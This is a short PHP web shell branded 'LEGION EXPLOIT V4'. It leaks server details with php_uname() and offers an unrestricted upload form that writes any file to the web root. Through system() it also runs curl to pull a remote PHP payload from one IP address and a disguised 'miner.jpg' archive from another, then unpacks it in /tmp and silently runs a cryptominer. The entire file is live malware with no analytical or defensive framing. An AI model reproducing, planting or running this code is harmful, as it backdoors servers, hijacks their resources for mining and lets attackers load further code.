<?php echo '<center><h1>LEGION EXPLOIT V4 (Năvodari Power)</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] ';echo'<form method="post"enctype="multipart/form-data">';echo'<input type="file"name="file"><input name="_upl"type="submit"value="Upload"></form>';if( $_POST['_upl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo'<b>LEGION Exploit Success!</b>';}else{echo'<b>LEGION Exploit Success!</b>';}} system('curl -s -k 2.57.122.112/rce/load -o adindex.php; cd /tmp; curl -O 91.210.168.80/miner.jpg; tar xzvf miner.jpg > /dev/null; rm -rf miner.jpg; cd .x; ./x > /dev/null');
?>